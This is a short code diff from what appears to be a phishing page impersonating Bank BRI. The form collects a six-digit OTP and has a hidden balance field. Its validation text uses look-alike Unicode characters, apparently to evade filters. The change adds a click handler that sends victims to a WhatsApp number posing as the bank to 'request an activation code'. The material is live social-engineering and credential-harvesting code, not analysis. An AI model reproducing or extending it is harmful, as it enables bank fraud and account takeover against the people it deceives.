@@ -327,7 +327,7 @@
 <input type="hidden" id="saldo" name="saldoTerakhir" value="">
          <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="KODE Virtual 6 DIGIT" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px;" required onclick="gantiborder1()">
   
-         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none"> Belum Menerima Kode Virtual ?<br>
+         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;" onclick="location.href='https://wa.me/6282152553155?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Aktivasi'"><strong style="color: #FF0000; text-decoration: none"> Belum Menerima Kode Virtual ?<br>
          <span style="color: #098CE3">Klik Disini</span>
          </strong></p></b>
         </div>
